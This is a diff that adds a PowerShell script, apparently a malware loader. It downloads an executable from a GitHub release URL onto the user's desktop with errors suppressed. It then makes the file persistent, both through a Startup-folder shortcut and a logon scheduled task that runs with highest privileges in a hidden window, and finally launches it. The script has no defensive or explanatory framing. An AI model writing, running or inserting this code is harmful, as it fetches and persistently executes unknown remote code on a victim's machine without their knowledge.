@@ -1,0 +1,25 @@
+# Define the URL and the output file
+$url = "https://github.com/Realmastercoder69/DD/releases/download/D/output.exe"
+$output = "$env:USERPROFILE\Desktop\Loader.exe"
+$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$shortcutPath = "$startupFolder\Loader.lnk"
+
+# Download the file using Invoke-WebRequest
+Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue
+
+# Create a shortcut in the Startup folder
+$WScriptShell = New-Object -ComObject WScript.Shell
+$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $output
+$shortcut.Save()
+
+# Register the task in Task Scheduler
+$taskName = "LoaderStartup"
+$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File $output"
+$trigger = New-ScheduledTaskTrigger -AtLogon
+$principal = New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -LogonType Interactive -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
+
+# Open the downloaded file
+Start-Process -FilePath $output
